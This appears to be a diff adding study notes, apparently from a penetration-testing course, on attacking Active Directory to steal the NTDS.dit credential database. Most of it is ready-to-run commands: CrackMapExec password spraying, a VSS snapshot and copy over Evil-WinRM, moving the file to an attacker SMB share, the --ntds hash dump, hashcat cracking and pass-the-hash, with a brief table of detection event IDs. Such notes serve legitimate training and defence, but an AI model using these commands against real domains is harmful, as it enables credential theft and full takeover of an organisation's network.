@@ -1,0 +1,141 @@
+🧠 Context Recap: What Is NTDS.dit?
+The NTDS.dit is the Active Directory database:
+
+Stores all domain user accounts and their password hashes.
+
+Lives on domain controllers at:
+
+makefile
+Copy
+Edit
+C:\Windows\NTDS\NTDS.dit
+To access it:
+
+You need Domain Admin or local admin on a DC.
+
+The file is locked during OS runtime, so we need Volume Shadow Copy (VSS) to grab it safely.
+
+🏹 Phase 1: Initial AD Enumeration & Creds
+Before dumping NTDS, you need:
+
+A foothold on the internal network
+
+A valid user credential, often obtained via:
+
+Password spraying
+
+LSASS dump
+
+SAM dump
+
+Phishing
+
+CVEs
+
+OSINT + brute/dictionary attack (CrackMapExec style)
+
+🧪 AD Dictionary Attack Flow (with CrackMapExec)
+bash
+Copy
+Edit
+crackmapexec smb <DC-IP> -u <userlist.txt> -p <passlist.txt>
+Example:
+
+bash
+Copy
+Edit
+crackmapexec smb 10.129.201.57 -u usernames.txt -p /usr/share/wordlists/fasttrack.txt
+✅ Successful login will be shown in green with [+]
+
+❌ Failure will be marked with STATUS_LOGON_FAILURE
+
+☠️ Be careful — you can trigger account lockouts if GPOs are in place (watch for event ID 4740 in logs)
+
+🔥 Tip: Always craft your userlists carefully using tools like username-anarchy or even scraping PDFs, company emails, etc.
+
+🧠 Phase 2: NTDS.dit Extraction
+✅ Method 1: Manual Extraction w/ Evil-WinRM
+Login to the DC
+
+bash
+Copy
+Edit
+evil-winrm -i <IP> -u <domain user> -p <password>
+Create a VSS snapshot
+
+powershell
+Copy
+Edit
+vssadmin create shadow /for=C:
+Copy the NTDS.dit from the snapshot
+
+powershell
+Copy
+Edit
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
+Transfer to your attack box
+
+powershell
+Copy
+Edit
+cmd.exe /c move C:\NTDS\NTDS.dit \\<attackerIP>\CompData
+✅ Method 2: CrackMapExec One-Liner
+bash
+Copy
+Edit
+crackmapexec smb <DC-IP> -u <user> -p <pass> --ntds
+Automatically does:
+
+VSS snapshot
+
+Copies NTDS.dit and SYSTEM
+
+Dumps all the hashes
+
+Logs results to ~/.cme/logs/
+
+🧠 Includes NTLM, Kerberos keys, and even krbtgt (🧨 used for Golden Ticket attacks in later modules)
+
+🧩 Bonus: Cracking or Using Hashes
+🔓 Cracking NTLM Hash (same as SAM section):
+bash
+Copy
+Edit
+hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
+💀 Pass-The-Hash with Evil-WinRM:
+bash
+Copy
+Edit
+evil-winrm -i <IP> -u <user> -H <NTLM hash>
+Even if you can’t crack it — you can often authenticate with the hash itself. This is the real power of NTLM and PTH.
+
+🔍 Defender’s POV – Detection & Logging
+Action	Event ID	Log Source
+Dictionary attack	4771 or 4625	Security
+VSS creation	513	System
+NTDS.dit access	4663 (if auditing enabled)	Security
+PTH Authentication	4624 w/ no pre-auth data	Security
+🧠 TL;DR Flow – "Attacking AD + NTDS.dit"
+text
+Copy
+Edit
+[✓] Valid user or admin access? 
+    → No → Spray / Enumerate / Dump LSASS / SAM / Phish
+
+[✓] Foothold?
+    → Yes → Evil-WinRM or CrackMapExec
+
+[✓] Admin access to DC?
+    → Yes → Proceed to dump NTDS.dit
+
+Method 1 (manual):
+    - Create VSS
+    - Copy from \\?\GLOBALROOT\Device\...
+    - Transfer over SMB
+
+Method 2 (auto):
+    - CME --ntds
+
+[✓] Got hashes?
+    → Crack with hashcat
+    → Or Pass-the-Hash with Evil-WinRM
